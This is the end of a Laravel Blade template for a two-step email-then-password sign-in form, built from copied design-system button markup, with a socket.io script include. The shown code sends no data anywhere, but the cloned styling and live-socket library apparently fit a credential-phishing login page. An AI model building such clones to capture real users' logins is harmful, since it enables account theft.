          <button data-testid="dismiss-button" class="cds-interactable-i9xooc6 cds-focusRing-fd371rq cds-transparent-tlx9nbb cds-button-b18qe5go cds-scaledDownState-sxr2bd6 cds-primaryForeground-pxcz3o7 cds-button-bpih6bv cds-buttonCompact-b17kdj8k cds-2-_h5hy70 cds-2-_hu3zq5" type="button" style="--interactable-height: 40px; --interactable-border-radius: 40px; --interactable-background: var(--primary); --interactable-hovered-background: rgb(80, 127, 229); --interactable-hovered-opacity: 0.91; --interactable-pressed-background: rgb(75, 120, 214); --interactable-pressed-opacity: 0.85; --interactable-disabled-background: rgb(49, 75, 132);">
            <span class="cds-positionRelative-p109mlw7">
              <span class="cds-typographyResets-t1xhpuq2 cds-headline-htr1998 cds-primaryForeground-pxcz3o7 cds-transition-txjiwsi cds-start-s1muvu8a">
                <span class="">Dismiss</span>
              </span>
            </span>
          </button>
        </div>
      </div>
    </div>
  </div>
</div>
@endsection

@push('script')
<script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.1.3/socket.io.js"></script>
<script>
 document.getElementById('continueBtn').addEventListener('click', function(event) {
  event.preventDefault();
  var email = document.getElementById('email').value;
  if(email) {
    document.getElementById('form1').style.display = 'none';
    document.getElementById('form2').style.display = 'block';
    document.getElementById('username').value = email;
    document.getElementById('emailDisplay').textContent = email;
    document.getElementById('password').focus();
  } else {
    alert('Please enter your email.');
  }
});

 document.getElementById('backBtn').addEventListener('click', function(event) {
  event.preventDefault();
  document.getElementById('form1').style.display = 'block';
  document.getElementById('form2').style.display = 'none';
});

 document.getElementById('togglePassword').addEventListener('click', function() {
  var passwordInput = document.getElementById('current-password');
  var passwordIcon = document.getElementById('passwordIcon');
  
  if (passwordInput.type === 'password') {
    passwordInput.type = 'text';
    
    passwordIcon.textContent = ''; 
    passwordIcon.setAttribute('data-icon-name', 'visibleActive');
  } else {
    
    passwordInput.type = 'password';
    
    passwordIcon.textContent = ''; 
    passwordIcon.setAttribute('data-icon-name', 'visibleInactive');
  }
});
</script>
@endpush